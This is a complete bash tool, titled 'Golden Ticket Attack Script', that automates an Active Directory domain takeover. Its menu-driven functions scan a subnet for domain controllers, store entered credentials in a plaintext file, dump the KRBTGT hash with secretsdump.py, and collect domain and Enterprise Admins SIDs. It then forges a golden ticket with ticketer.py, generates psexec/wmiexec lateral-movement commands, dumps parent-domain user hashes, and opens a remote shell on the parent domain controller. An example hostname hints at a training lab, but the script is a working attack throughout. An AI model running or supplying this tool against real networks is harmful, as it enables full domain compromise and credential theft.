#!/bin/bash

# Configuration files
CONFIG_FILE="target.conf"
HASH_FILE="krbtgt_hash.txt"
TICKET_FILE="ticket.info"

# Discover domain controllers
discover_dcs() {
    echo "[*] Starting DC discovery..."

    interfaces=$(ip -4 addr show | grep -E "^[0-9]+:" | grep -v "lo:" | grep -v "docker" | while read line; do
        iface=$(echo "$line" | awk '{print $2}' | tr -d ':')
        ip_info=$(ip -4 addr show "$iface" | grep "inet " | awk '{print $2}')
        [ ! -z "$ip_info" ] && echo "$iface|$ip_info"
    done)

    if [ -z "$interfaces" ]; then
        echo "[ERROR] No active network interfaces found"
        return 1
    fi

    echo "[*] Available interfaces:"
    echo "$interfaces" | nl -w2 -s'. '

    echo -n "Select interface number: "
    read iface_num

    selected=$(echo "$interfaces" | sed -n "${iface_num}p")
    if [ -z "$selected" ]; then
        echo "[ERROR] Invalid interface selection"
        return 1
    fi

    IFS='|' read -r iface ip_cidr <<< "$selected"

    ip=$(echo $ip_cidr | cut -d'/' -f1)
    base=$(echo $ip | cut -d'.' -f1-3)
    network="${base}.0/24"

    echo "[*] Scanning $network for DCs (ports 88,389,445)..."
    dc_ips=$(sudo nmap -p 88,389,445 --open "$network" --min-rate 1000 -oG - 2>/dev/null | \
             awk '/88\/open.*389\/open.*445\/open/{print $2}')

    if [ -z "$dc_ips" ]; then
        echo "[ERROR] No DCs found"
        return 1
    fi

    echo "[*] Found DCs: $dc_ips"

    declare -A dcs
    for dc_ip in $dc_ips; do
        echo "[*] Querying $dc_ip..."
        ldap_info=$(ldapsearch -x -H ldap://$dc_ip -b "" -s base \
                    defaultNamingContext dnsHostName 2>/dev/null)

        if [ ! -z "$ldap_info" ]; then
            hostname=$(echo "$ldap_info" | grep "dnsHostName:" | awk '{print $2}')
            domain=$(echo "$ldap_info" | grep "defaultNamingContext:" | head -1 | \
                    sed 's/defaultNamingContext: //' | sed 's/DC=//g' | sed 's/,/./g')

            dcs[$dc_ip]="$hostname|$domain"
            echo "  DC: $hostname ($dc_ip)"
            echo "  Domain: $domain"
        fi
    done

    if [ ${#dcs[@]} -eq 0 ]; then
        echo "[ERROR] No valid DCs found"
        return 1
    fi

    echo "[*] Available DCs:"
    counter=1
    for dc_ip in "${!dcs[@]}"; do
        IFS='|' read -r hostname domain <<< "${dcs[$dc_ip]}"
        echo "  $counter. $hostname ($dc_ip) - $domain"
        counter=$((counter+1))
    done

    echo -n "Select DC number: "
    read dc_choice

    counter=1
    selected_dc_ip=""
    for dc_ip in "${!dcs[@]}"; do
        if [ $counter -eq $dc_choice ]; then
            IFS='|' read -r hostname domain <<< "${dcs[$dc_ip]}"
            selected_dc_ip="$dc_ip"
            selected_hostname="$hostname"
            selected_domain="$domain"
            break
        fi
        counter=$((counter+1))
    done

    if [ -z "$selected_dc_ip" ]; then
        echo "[ERROR] Invalid DC selection"
        return 1
    fi

    echo -n "Username: "
    read username
    echo -n "Password: "
    read -s password
    echo ""

    if [ -z "$username" ] || [ -z "$password" ]; then
        echo "[ERROR] Username and password required"
        return 1
    fi

    cat > "$CONFIG_FILE" << EOF
DC_IP="$selected_dc_ip"
DC_NAME="$selected_hostname"
DOMAIN="$selected_domain"
DOMAIN_SHORT="$(echo $selected_domain | cut -d'.' -f1)"
USERNAME="$username"
PASSWORD="$password"
EOF

    echo "[*] Configuration saved to $CONFIG_FILE"
    echo "[*] Target: $selected_hostname ($selected_dc_ip) - $selected_domain"
}

# Extract KRBTGT hash
extract_krbtgt() {
    echo "[*] Extracting KRBTGT hash..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    source "$CONFIG_FILE"

    echo "[*] Running: secretsdump.py $DOMAIN/$USERNAME@$DC_IP -just-dc-user $DOMAIN_SHORT/krbtgt"

    output=$(secretsdump.py "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc-user "$DOMAIN_SHORT/krbtgt" 2>&1)

    krbtgt_hash=$(echo "$output" | grep -E "krbtgt:.*:.*:.*:" | awk -F':' '{print $4}')

    if [ -z "$krbtgt_hash" ]; then
        echo "[ERROR] Could not extract KRBTGT hash"
        echo "[*] Output: $output"
        return 1
    fi

    echo "KRBTGT_HASH=$krbtgt_hash" > "$HASH_FILE"
    echo "[*] KRBTGT hash: $krbtgt_hash"
    echo "[*] Saved to $HASH_FILE"
}

# Get domain SID
get_domain_sid() {
    echo "[*] Getting domain SID..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    source "$CONFIG_FILE"

    echo "[*] Running: lookupsid.py $DOMAIN/$USERNAME@$DC_IP"

    output=$(lookupsid.py "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" 2>&1)

    domain_sid=$(echo "$output" | grep "Domain SID is:" | awk -F': ' '{print $2}' | tr -d '[:space:]')

    if [ -z "$domain_sid" ]; then
        echo "[ERROR] Could not get domain SID"
        echo "[*] Output: $output"
        return 1
    fi

    # Update config file with domain SID
    if grep -q "DOMAIN_SID=" "$CONFIG_FILE"; then
        sed -i "s|DOMAIN_SID=.*|DOMAIN_SID=\"$domain_sid\"|" "$CONFIG_FILE"
    else
        echo "DOMAIN_SID=\"$domain_sid\"" >> "$CONFIG_FILE"
    fi

    echo "[*] Domain SID: $domain_sid"
    echo "[*] Updated $CONFIG_FILE"
}

# Find Enterprise Admins
find_enterprise_admins() {
    echo "[*] Finding Enterprise Admins SID..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    source "$CONFIG_FILE"

    echo -n "Root DC IP (press Enter to scan): "
    read root_dc_ip

    if [ -z "$root_dc_ip" ]; then
        network=$(echo $DC_IP | cut -d'.' -f1-3)
        echo "[*] Scanning ${network}.0/24 for additional DCs..."

        other_dcs=$(sudo nmap -p 88,389,445 --open "$network.0/24" --min-rate 1000 -oG - 2>/dev/null | \
                   awk '/88\/open.*389\/open.*445\/open/{print $2}' | grep -v "$DC_IP" | head -1)

        if [ -z "$other_dcs" ]; then
            echo "[WARNING] No additional DCs found"
            echo "[*] Continuing without Enterprise Admins SID"
            return 0
        fi

        root_dc_ip="$other_dcs"
        echo "[*] Using $root_dc_ip"
    fi

    # Update config with root DC IP
    if grep -q "ROOT_DC_IP=" "$CONFIG_FILE"; then
        sed -i "s|ROOT_DC_IP=.*|ROOT_DC_IP=\"$root_dc_ip\"|" "$CONFIG_FILE"
    else
        echo "ROOT_DC_IP=\"$root_dc_ip\"" >> "$CONFIG_FILE"
    fi

    echo "[*] Running: lookupsid.py $DOMAIN/$USERNAME@$root_dc_ip"

    output=$(lookupsid.py "$DOMAIN/$USERNAME:$PASSWORD@$root_dc_ip" 2>&1)

    root_sid=$(echo "$output" | grep "Domain SID is:" | awk -F': ' '{print $2}' | tr -d '[:space:]')
    rid=$(echo "$output" | grep "Enterprise Admins" | grep -oE "^[0-9]+" | head -1)

    if [ ! -z "$root_sid" ] && [ ! -z "$rid" ]; then
        enterprise_sid="${root_sid}-${rid}"

        if grep -q "ENTERPRISE_SID=" "$CONFIG_FILE"; then
            sed -i "s|ENTERPRISE_SID=.*|ENTERPRISE_SID=\"$enterprise_sid\"|" "$CONFIG_FILE"
        else
            echo "ENTERPRISE_SID=\"$enterprise_sid\"" >> "$CONFIG_FILE"
        fi

        if grep -q "ROOT_DOMAIN_SID=" "$CONFIG_FILE"; then
            sed -i "s|ROOT_DOMAIN_SID=.*|ROOT_DOMAIN_SID=\"$root_sid\"|" "$CONFIG_FILE"
        else
            echo "ROOT_DOMAIN_SID=\"$root_sid\"" >> "$CONFIG_FILE"
        fi

        echo "[*] Enterprise Admins SID: $enterprise_sid"
        echo "[*] Updated $CONFIG_FILE"
    else
        echo "[WARNING] Could not find Enterprise Admins SID"
        echo "[*] Will create regular Domain Admin ticket"
    fi
}

# Create golden ticket
create_golden_ticket() {
    echo "[*] Creating golden ticket..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    if [ ! -f "$HASH_FILE" ]; then
        echo "[ERROR] Extract KRBTGT hash first (option 3)"
        return 1
    fi

    source "$CONFIG_FILE"
    source "$HASH_FILE"

    if [ -z "$DOMAIN_SID" ]; then
        echo "[ERROR] Get domain SID first (option 4)"
        return 1
    fi

    echo -n "Username for ticket (default: administrator): "
    read ticket_user
    ticket_user=${ticket_user:-administrator}

    cmd="ticketer.py -nthash $KRBTGT_HASH -domain $DOMAIN -domain-sid $DOMAIN_SID"

    if [ ! -z "$ENTERPRISE_SID" ]; then
        cmd="$cmd -extra-sid $ENTERPRISE_SID"
        echo "[*] Creating Enterprise Admin ticket"
    else
        echo "[*] Creating Domain Admin ticket"
    fi

    cmd="$cmd $ticket_user"

    echo "[*] Running: $cmd"
    eval "$cmd"

    if [ -f "${ticket_user}.ccache" ]; then
        cat > "$TICKET_FILE" << EOF
TICKET_USER="$ticket_user"
CCACHE_FILE="${ticket_user}.ccache"
EOF
        echo "[*] Ticket created: ${ticket_user}.ccache"
        echo "[*] Use: export KRB5CCNAME=${ticket_user}.ccache"
    else
        echo "[ERROR] Ticket creation failed"
        return 1
    fi
}

# Generate lateral movement commands
generate_lateral_commands() {
    echo "[*] Generating lateral movement commands..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    if [ ! -f "$TICKET_FILE" ]; then
        echo "[ERROR] Create golden ticket first (option 6)"
        return 1
    fi

    source "$CONFIG_FILE"
    source "$TICKET_FILE"

    echo -n "Target hostname (e.g., ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL): "
    read target_host

    if [ -z "$target_host" ]; then
        echo "[ERROR] Target hostname required"
        return 1
    fi

    echo -n "Target IP: "
    read target_ip

    if [ -z "$target_ip" ]; then
        target_ip=$(host "$target_host" 2>/dev/null | awk '/has address/ {print $4; exit}')
        if [ ! -z "$target_ip" ]; then
            echo "[*] Resolved to $target_ip"
        else
            echo "[ERROR] Could not resolve hostname and no IP provided"
            return 1
        fi
    fi

    cat > "lateral_commands.sh" << EOF
#!/bin/bash
export KRB5CCNAME=$CCACHE_FILE

# PSExec
psexec.py $DOMAIN/$TICKET_USER@$target_host -k -no-pass -target-ip $target_ip

# WMIExec
# wmiexec.py $DOMAIN/$TICKET_USER@$target_host -k -no-pass -target-ip $target_ip

# SMBExec
# smbexec.py $DOMAIN/$TICKET_USER@$target_host -k -no-pass -target-ip $target_ip

# Secretsdump
# secretsdump.py $DOMAIN/$TICKET_USER@$target_host -k -no-pass -target-ip $target_ip

# SMBClient
# smbclient.py $DOMAIN/$TICKET_USER@$target_host -k -no-pass -target-ip $target_ip
EOF

    chmod +x lateral_commands.sh
    echo "[*] Commands saved to lateral_commands.sh"
}

# Extract specific user hash from parent domain
extract_user_hash() {
    echo "[*] Extracting user hash from parent domain..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    if [ ! -f "$TICKET_FILE" ]; then
        echo "[ERROR] Create golden ticket first (option 6)"
        return 1
    fi

    source "$CONFIG_FILE"
    source "$TICKET_FILE"

    if [ -z "$ROOT_DC_IP" ]; then
        echo -n "Enter parent domain DC IP: "
        read parent_dc_ip
        if [ -z "$parent_dc_ip" ]; then
            echo "[ERROR] Parent DC IP required"
            return 1
        fi
    else
        parent_dc_ip="$ROOT_DC_IP"
    fi

    echo -n "Target username to extract: "
    read target_user

    if [ -z "$target_user" ]; then
        echo "[ERROR] Target username required"
        return 1
    fi

    # Get parent domain
    if [ ! -z "$ROOT_DOMAIN_SID" ]; then
        parent_domain=$(ldapsearch -x -H ldap://$parent_dc_ip -b "" -s base defaultNamingContext 2>/dev/null | \
                       grep "defaultNamingContext:" | head -1 | sed 's/defaultNamingContext: //' | \
                       sed 's/DC=//g' | sed 's/,/./g')
    fi

    if [ -z "$parent_domain" ]; then
        echo -n "Parent domain FQDN: "
        read parent_domain
        if [ -z "$parent_domain" ]; then
            echo "[ERROR] Parent domain required"
            return 1
        fi
    fi

    parent_domain_short=$(echo $parent_domain | cut -d'.' -f1)

    echo "[*] Setting Kerberos ticket..."
    export KRB5CCNAME=$CCACHE_FILE

    echo "[*] Extracting hash for $target_user from $parent_domain..."
    echo "[*] Running: secretsdump.py $DOMAIN/$TICKET_USER@$parent_dc_ip -just-dc-user $parent_domain_short/$target_user -k -no-pass"

    output=$(secretsdump.py "$DOMAIN/$TICKET_USER@$parent_dc_ip" -just-dc-user "$parent_domain_short/$target_user" -k -no-pass -target-ip "$parent_dc_ip" 2>&1)

    user_hash=$(echo "$output" | grep -i "$target_user:" | awk -F':' '{print $4}')

    if [ -z "$user_hash" ]; then
        echo "[WARNING] Targeted extraction failed, trying full dump..."
        output=$(secretsdump.py "$DOMAIN/$TICKET_USER@$parent_dc_ip" -k -no-pass -target-ip "$parent_dc_ip" 2>&1)
        user_hash=$(echo "$output" | grep -i "$target_user:" | awk -F':' '{print $4}')
    fi

    if [ ! -z "$user_hash" ]; then
        echo "[*] Hash for $target_user: $user_hash"
        echo "$target_user:$user_hash" >> "extracted_hashes.txt"
        echo "[*] Saved to extracted_hashes.txt"
    else
        echo "[ERROR] Failed to extract hash"
        echo "[*] Output: $output"
        return 1
    fi
}

# Interactive shell on parent domain
interactive_shell() {
    echo "[*] Starting interactive shell on parent domain..."

    if [ ! -f "$CONFIG_FILE" ]; then
        echo "[ERROR] Run discovery first (option 2)"
        return 1
    fi

    if [ ! -f "$TICKET_FILE" ]; then
        echo "[ERROR] Create golden ticket first (option 6)"
        return 1
    fi

    source "$CONFIG_FILE"
    source "$TICKET_FILE"

    if [ -z "$ROOT_DC_IP" ]; then
        echo -n "Enter parent domain DC IP: "
        read parent_dc_ip
        if [ -z "$parent_dc_ip" ]; then
            echo "[ERROR] Parent DC IP required"
            return 1
        fi
    else
        parent_dc_ip="$ROOT_DC_IP"
    fi

    echo -n "Parent domain DC hostname: "
    read parent_dc_host

    if [ -z "$parent_dc_host" ]; then
        echo "[ERROR] Parent DC hostname required"
        return 1
    fi

    echo "[*] Setting Kerberos ticket..."
    export KRB5CCNAME=$CCACHE_FILE

    echo "[*] Connecting to $parent_dc_host ($parent_dc_ip)..."
    psexec.py "$DOMAIN/$TICKET_USER@$parent_dc_host" -k -no-pass -target-ip "$parent_dc_ip"
}

# Full attack chain
full_attack() {
    echo "[*] Running full attack chain..."
    echo ""

    if ! discover_dcs; then
        echo "[ERROR] Discovery failed"
        return 1
    fi
    echo ""

    if ! extract_krbtgt; then
        echo "[ERROR] KRBTGT extraction failed"
        return 1
    fi
    echo ""

    if ! get_domain_sid; then
        echo "[ERROR] Domain SID retrieval failed"
        return 1
    fi
    echo ""

    if ! find_enterprise_admins; then
        echo "[WARNING] Enterprise Admins not found, continuing..."
    fi
    echo ""

    if ! create_golden_ticket; then
        echo "[ERROR] Golden ticket creation failed"
        return 1
    fi
    echo ""

    if ! generate_lateral_commands; then
        echo "[WARNING] Lateral command generation failed"
    fi
    echo ""

    echo "[*] Attack chain complete"
    echo "[*] Run ./lateral_commands.sh to execute lateral movement"
    echo "[*] Or use option 8 to extract specific user hashes"
}

# Show current status
show_status() {
    echo "[*] Current status:"
    echo ""

    if [ -f "$CONFIG_FILE" ]; then
        echo "[+] Configuration file exists"
        source "$CONFIG_FILE"
        echo "    Domain: $DOMAIN"
        echo "    DC: $DC_NAME ($DC_IP)"
        [ ! -z "$DOMAIN_SID" ] && echo "    Domain SID: $DOMAIN_SID"
        [ ! -z "$ROOT_DC_IP" ] && echo "    Root DC: $ROOT_DC_IP"
        [ ! -z "$ENTERPRISE_SID" ] && echo "    Enterprise SID: $ENTERPRISE_SID"
    else
        echo "[-] No configuration file (run option 2)"
    fi
    echo ""

    if [ -f "$HASH_FILE" ]; then
        source "$HASH_FILE"
        echo "[+] KRBTGT hash: $KRBTGT_HASH"
    else
        echo "[-] No KRBTGT hash (run option 3)"
    fi
    echo ""

    if [ -f "$TICKET_FILE" ]; then
        source "$TICKET_FILE"
        echo "[+] Golden ticket: $CCACHE_FILE"
    else
        echo "[-] No golden ticket (run option 6)"
    fi
    echo ""
}

# Main menu
main_menu() {
    while true; do
        echo "==============================================="
        echo "Golden Ticket Attack Script"
        echo "==============================================="
        echo ""
        echo "1. Full Attack Chain (automated)"
        echo "2. Discover DCs (required first)"
        echo "3. Extract KRBTGT Hash"
        echo "4. Get Domain SID"
        echo "5. Find Enterprise Admins"
        echo "6. Create Golden Ticket"
        echo "7. Generate Lateral Movement Commands"
        echo "8. Extract User Hash from Parent Domain"
        echo "9. Interactive Shell on Parent Domain"
        echo "10. Show Current Status"
        echo "0. Exit"
        echo ""
        echo -n "Select option: "
        read choice
        echo ""

        case $choice in
            1) full_attack ;;
            2) discover_dcs ;;
            3) extract_krbtgt ;;
            4) get_domain_sid ;;
            5) find_enterprise_admins ;;
            6) create_golden_ticket ;;
            7) generate_lateral_commands ;;
            8) extract_user_hash ;;
            9) interactive_shell ;;
            10) show_status ;;
            0)
                echo "[*] Exiting..."
                exit 0
                ;;
            *)
                echo "[ERROR] Invalid option"
                ;;
        esac

        echo ""
        echo "Press Enter to continue..."
        read
        clear
    done
}

# Check for required tools
check_tools() {
    missing=0
    for tool in nmap ldapsearch python3; do
        if ! command -v $tool &> /dev/null; then
            echo "[ERROR] Missing required tool: $tool"
            missing=1
        fi
    done

    if ! python3 -c "import impacket" 2>/dev/null; then
        echo "[ERROR] Impacket not installed"
        missing=1
    fi

    if [ $missing -eq 1 ]; then
        echo "[*] Install missing tools and try again"
        exit 1
    fi
}

# Main execution
clear
check_tools
main_menu
